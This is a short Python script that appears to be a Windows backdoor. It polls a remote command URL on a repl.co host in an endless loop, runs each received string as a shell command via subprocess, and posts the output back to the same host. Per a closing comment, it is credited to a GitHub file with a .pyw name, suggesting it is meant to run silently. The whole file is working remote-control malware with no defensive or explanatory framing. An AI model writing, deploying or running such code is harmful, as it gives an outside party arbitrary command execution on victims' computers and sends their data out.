import requests
import os
from time import sleep
import subprocess
from _thread import *

userprof = os.getenv('userprofile')
Currentpath = os.getcwd().strip('/n')
destination = userprof.strip('\n\r') + '\\Videos\\'
os.chdir(destination)


POST_URL = "https://sus.yardenfadel.repl.co/POST-CONTROLLED"
GET_URL = "https://sus.yardenfadel.repl.co/COMMANDS"
out = ""
err = ""

def do(INPUT_COMMAND,blah):
    global out
    global err
    cmd = subprocess.run(INPUT_COMMAND, capture_output=True, shell=True,stdin=subprocess.DEVNULL)
    out = cmd.stdout.decode()
    err = cmd.stderr.decode()
    out = out + err
    print(out)
    if len(err) > 1:
        obj = {"data":err}
        print(err)
    else:
        obj = {"data":out}
        print(out)
        POST_r = requests.post(url = POST_URL, data=obj)
while True:
    r = requests.get(url = GET_URL)

    splitted = r.text.split("<br>")
    print(splitted)
    if splitted[-1] == "...END...":
        sleep(0.22)
    else:
        command = splitted[-1]
        try:
            print(command)
            if command.startswith("thread"):
                start_new_thread(do,(command[7:],"balh"))
            else:
                cmd = subprocess.run(command, capture_output=True, shell=True,stdin=subprocess.DEVNULL)
                out = cmd.stdout.decode()
                err = cmd.stderr.decode()
            print(f"out is {out}")
            print(f"err is {err}")
            if len(err) > 1:
     	       obj = {"data":err}
     	       print(err)
            else:
       	       obj = {"data":out}
       	       print(out)
            POST_r = requests.post(url = POST_URL, data=obj)
       	    sleep(0.02)
        except Exception as e:
            POST_r = requests.post(url = POST_URL, data={"data":e})
//credit to https://github.com/jonathanbreitg/dump/blob/main/small_amongus.pyw
